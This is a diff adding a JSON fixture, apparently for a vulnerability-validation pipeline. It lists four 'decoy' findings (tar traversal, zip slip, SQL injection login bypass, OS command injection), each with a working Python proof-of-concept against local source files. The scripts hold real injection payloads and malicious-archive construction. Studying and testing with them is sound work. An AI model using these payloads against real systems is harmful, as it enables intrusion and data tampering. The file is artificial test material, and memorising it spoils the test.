@@ -1,0 +1,99 @@
+{
+  "validator_verdict": "confirmed",
+  "hunts": {
+    "src/data-isolation-and-lifecycle": [
+      {
+        "id": "decoy-tar-traversal",
+        "verdict": "needs_validation",
+        "title": "Tar member paths escape the destination in extract()",
+        "attack_class": "data-isolation-and-lifecycle",
+        "weakness": "CWE-22: Path Traversal",
+        "threat_model": {
+          "attacker": "attacker who supplies the tar archive",
+          "boundary": "archive member path escapes dest"
+        },
+        "location": {
+          "file": "src/extract.py",
+          "line": 31,
+          "symbol": "extract"
+        },
+        "description": "Claims '../', absolute or symlinked member names write outside dest.",
+        "poc": {
+          "kind": "script",
+          "content": "import io, os, tarfile, tempfile, importlib.util\ns = importlib.util.spec_from_file_location('extract', 'src/extract.py')\nm = importlib.util.module_from_spec(s); s.loader.exec_module(m)\nwork = tempfile.mkdtemp(); dest = os.path.join(work, 'out'); os.makedirs(dest)\nescaped = []\nfor name, kind in [('../pwned1.txt', 'file'), (os.path.join(work, 'pwned2.txt'), 'file'),\n                   ('link', 'symlink')]:\n    tarp = os.path.join(work, 'mal.tar')\n    with tarfile.open(tarp, 'w') as tf:\n        if kind == 'symlink':\n            info = tarfile.TarInfo('link'); info.type = tarfile.SYMTYPE; info.linkname = work\n            tf.addfile(info)\n            data = b'owned'; f = tarfile.TarInfo('link/pwned3.txt'); f.size = len(data)\n            tf.addfile(f, io.BytesIO(data))\n        else:\n            data = b'owned'; info = tarfile.TarInfo(name); info.size = len(data)\n            tf.addfile(info, io.BytesIO(data))\n    try:\n        m.extract(tarp, dest)\n    except Exception:\n        pass\nfor n in ('pwned1.txt', 'pwned2.txt', 'pwned3.txt'):\n    if os.path.exists(os.path.join(work, n)):\n        escaped.append(n)\nassert escaped, 'no escape'\nprint('TRAVERSAL_OK', escaped)\n",
+          "observed": "TRAVERSAL_OK"
+        }
+      },
+      {
+        "id": "decoy-zip-slip",
+        "verdict": "needs_validation",
+        "title": "Zip entry names escape the destination in unzip()",
+        "attack_class": "data-isolation-and-lifecycle",
+        "weakness": "CWE-22: Path Traversal (Zip Slip)",
+        "threat_model": {
+          "attacker": "attacker who supplies the zip archive",
+          "boundary": "archive entry path escapes dest"
+        },
+        "location": {
+          "file": "src/unzip.py",
+          "line": 26,
+          "symbol": "unzip"
+        },
+        "description": "Claims '../' or absolute entry names write outside dest.",
+        "poc": {
+          "kind": "script",
+          "content": "import os, zipfile, tempfile, importlib.util\ns = importlib.util.spec_from_file_location('unzip', 'src/unzip.py')\nm = importlib.util.module_from_spec(s); s.loader.exec_module(m)\nwork = tempfile.mkdtemp(); dest = os.path.join(work, 'out'); os.makedirs(dest)\nescaped = []\nfor name in ('../pwned1.txt', os.path.join(work, 'pwned2.txt')):\n    zp = os.path.join(work, 'mal.zip')\n    with zipfile.ZipFile(zp, 'w') as zf:\n        zf.writestr(zipfile.ZipInfo(name), b'owned')\n    try:\n        m.unzip(zp, dest)\n    except Exception:\n        pass\nfor n in ('pwned1.txt', 'pwned2.txt'):\n    if os.path.exists(os.path.join(work, n)):\n        escaped.append(n)\nassert escaped, 'no escape'\nprint('ZIPSLIP_OK', escaped)\n",
+          "observed": "ZIPSLIP_OK"
+        }
+      }
+    ],
+    "src/web-protocol-and-auth": [
+      {
+        "id": "decoy-sqli",
+        "verdict": "needs_validation",
+        "title": "SQL injection auth bypass in login()",
+        "attack_class": "web-protocol-and-auth",
+        "weakness": "CWE-89: SQL Injection",
+        "threat_model": {
+          "attacker": "unauthenticated user controlling username/password",
+          "boundary": "input reaches SQL text"
+        },
+        "location": {
+          "file": "src/auth.py",
+          "line": 31,
+          "symbol": "login"
+        },
+        "description": "Claims a crafted username or password bypasses the password check.",
+        "poc": {
+          "kind": "script",
+          "content": "import os, tempfile, importlib.util\ns = importlib.util.spec_from_file_location('auth', 'src/auth.py')\nm = importlib.util.module_from_spec(s); s.loader.exec_module(m)\nwork = tempfile.mkdtemp(); db = os.path.join(work, 'app.db')\nm.init_db(db); m.add_user(db, 'admin', 's3cret')\nbypassed = [p for p in [('admin', \"x' OR '1'='1\"), (\"admin'--\", 'x'), (\"' OR 1=1--\", 'x')]\n            if m.login(db, *p) is True]\nassert bypassed, 'no bypass'\nprint('SQLI_OK', bypassed)\n",
+          "observed": "SQLI_OK"
+        }
+      }
+    ],
+    "src/cloud-and-deployment": [
+      {
+        "id": "decoy-cmd-injection",
+        "verdict": "needs_validation",
+        "title": "OS command injection in ping()",
+        "attack_class": "cloud-and-deployment",
+        "weakness": "CWE-78: OS Command Injection",
+        "threat_model": {
+          "attacker": "user controlling the host argument",
+          "boundary": "input reaches a shell"
+        },
+        "location": {
+          "file": "src/net.py",
+          "line": 21,
+          "symbol": "ping"
+        },
+        "description": "Claims shell metacharacters in host run arbitrary commands.",
+        "poc": {
+          "kind": "script",
+          "content": "import os, tempfile, importlib.util\ns = importlib.util.spec_from_file_location('net', 'src/net.py')\nm = importlib.util.module_from_spec(s); s.loader.exec_module(m)\nwork = tempfile.mkdtemp(); marker = os.path.join(work, 'pwned')\nfor payload in ('localhost; touch ' + marker, 'localhost && touch ' + marker,\n                '$(touch ' + marker + ')', '`touch ' + marker + '`'):\n    try:\n        m.ping(payload)\n    except Exception:\n        pass\nassert os.path.exists(marker), 'no injection'\nprint('CMDI_OK')\n",
+          "observed": "CMDI_OK"
+        }
+      }
+    ]
+  }
+}
